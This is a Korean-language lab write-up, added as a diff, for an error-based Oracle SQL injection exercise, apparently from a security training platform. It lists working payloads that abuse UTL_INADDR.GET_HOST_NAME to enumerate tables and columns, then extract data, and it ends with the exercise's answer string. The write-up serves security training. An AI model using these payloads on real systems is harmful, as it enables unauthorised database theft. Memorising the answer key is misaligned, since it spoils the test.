@@ -1,0 +1,56 @@
+===================================
+SQL Injection Oracle 6번 - Error-based
+===================================
+
+* CTXSYS.DRITHSX.SN <- 이거 말고 딴거 사용하기
+
+1. 공격 과정
+ 1) 쿼리문 유추
+	qq 입력 결과 qqq 조회 => LIKE 사용
+
+ 2) 공격 포인트
+	qq'||'%') AND 1=1 AND (B.TITLE LIKE '%'||'
+    	=> qqq 정상 조회
+	=
+    	qq'||'%') AND 1=2 AND (B.TITLE LIKE '%'||'
+    	=> 조회되지 않음
+
+    	keyword 파라미터에서 SQL Injection 가능 확인
+
+ 3) 제약 사항
+  3-1) 에러메시지 확인
+  3-2) 에러 유발 함수
+	 UTL_INADDR.GET_HOST_NAME()
+
+ 4) 테이블명
+  4-1) 테이블 개수 
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(*)) FROM user_tables)) IS NULL AND (B.TITLE LIKE '%'||'
+      	=> 에러 메세지에 host 6 unknown 확인
+  4-2) 테이블 1row씩
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT a FROM (SELECT table_name a, ROWNUM b FROM user_tables) WHERE b=5)) IS NULL AND (B.TITLE LIKE '%'||'
+	=> 에러 메세지에 host EQST_ANSWER unknown 확인
+
+ 5) 컬럼명
+  5-1) 컬럼 개수
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(column_name)) FROM cols WHERE table_name='EQST_ANSWER')) IS NULL AND (B.TITLE LIKE '%'||'
+	=> ORA-29257: host 5 unknown
+	=> MEMBER 테이블의 컬럼 개수는 5개
+  5-2) 컬럼 1row씩
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT a FROM (SELECT column_name a, ROWNUM b FROM cols WHERE table_name='EQST_ANSWER') WHERE b=1)) IS NULL AND (B.TITLE LIKE '%'||'
+	=> 1번째 컬럼: ORA-29257: host ANSWER_COLUMN unknown => ANSWER_COLUMN
+       	=> 2번째 컬럼: ORA-29257: host REG_DT unknown => REG_DT 
+	=> 3번째 컬럼: ORA-29257: host REG_ACCT_ID unknown => REG_ACCT_ID
+	=> 4번째 컬럼: ORA-29257: host UDT_DT unknown => UDT_DT
+	=> 5번째 컬럼: ORA-29257: host UDT_ACCT_ID unknown => UDT_ACCT_ID
+	
+ 6) 데이터 탈취
+  6-1) 데이터 개수
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(*)) FROM EQST_ANSWER)) IS NULL AND (B.TITLE LIKE '%'||'
+	=> ORA-29257: host 1 unknown => 관련된 데이터 1개
+  6-2) 데이터 1row씩
+	qq'||'%') AND UTL_INADDR.GET_HOST_NAME((SELECT a FROM (SELECT ANSWER_COLUMN a, ROWNUM b FROM EQST_ANSWER) WHERE b=1)) IS NULL AND (B.TITLE LIKE '%'||'
+	=> ORA-29257: host skinfosec_eqst_lms_system unknown 	
+2. 정답
+	skinfosec_eqst_lms_system
+
+============================
